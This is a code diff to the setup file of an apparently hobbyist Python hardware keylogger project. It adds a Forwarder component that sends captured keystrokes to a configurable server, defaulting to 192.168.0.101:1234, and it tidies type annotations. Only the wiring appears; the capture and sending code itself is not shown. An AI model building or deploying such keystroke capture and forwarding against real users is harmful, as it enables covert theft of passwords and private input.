@@ -1,9 +1,9 @@
 import sys
 import logging
 import argparse
-from collections import defaultdict
 from src.DataHandler import DataHandler
 from src.KeyLogger import KeyLogger
+from src.Forwarder import Forwarder
 import json
 
 
@@ -11,15 +11,17 @@ class Logger:
     __slots__ = ["root_handler", "stream_handler", "__mode", "keylogger"]
 
     def __init__(self, mode: str) -> None:
-        self.__mode = mode
-        self.root_handler = logging.getLogger()
+        self.__mode: str = mode
+        self.root_handler: logging = logging.getLogger()
         if mode == "debug" or mode == "d":
             self.root_handler.setLevel(logging.DEBUG)
         elif mode is None or mode == "production" or mode == "p":
             self.root_handler.setLevel(logging.INFO)
-        handler = logging.StreamHandler(sys.stdout)
+        handler: logging.StreamHandler = logging.StreamHandler(sys.stdout)
         handler.setLevel(logging.DEBUG)
-        formatter = logging.Formatter("%(asctime)s:%(levelname)s : %(message)s")
+        formatter: logging.Formatter = logging.Formatter(
+            "%(asctime)s:%(levelname)s : %(message)s"
+        )
         handler.setFormatter(formatter)
         self.root_handler.addHandler(handler)
         logging.info("Starting Python Hardware Keylogger")
@@ -28,16 +30,23 @@ class Logger:
 class Setup:
     __slots__ = ["logger", "dataHandler", "__keylogger"]
 
-    def __init__(self, args):
-        self.logger = Logger((lambda m: m if m else None)(args.mode))
-        if args.keyboard:
-            keyboard_layout: dict[int, int] = self.read_keyboard_layout(args.keyboard)
-        else:
-            keyboard_layout: dict[int, int] = self.read_keyboard_layout("mini_keyboard")
-        self.__keylogger = KeyLogger(keyboard_layout, DataHandler())
+    def __init__(self, args) -> None:
+        self.logger: Logger = Logger((lambda m: m if m else None)(args.mode))
+        keyboard_layout: dict[int, int] = self.read_keyboard_layout(
+            (lambda k: k if k else "mini_keyboard")(args.keyboard)
+        )
+        forwarder: Forwarder = Forwarder(
+            server_ip=(lambda i: i if i else "192.168.0.101")(args.ip),
+            port=(lambda p: p if p else "1234")(args.port),
+        )
+        self.__keylogger: KeyLogger = KeyLogger(
+            keyboard_layout=keyboard_layout,
+            data_handler=DataHandler(),
+            forwarder=forwarder,
+        )
         logging.info("Setup Complete")
 
-    def get_keylogger(self):
+    def get_keylogger(self) -> KeyLogger:
         return self.__keylogger
 
     @staticmethod
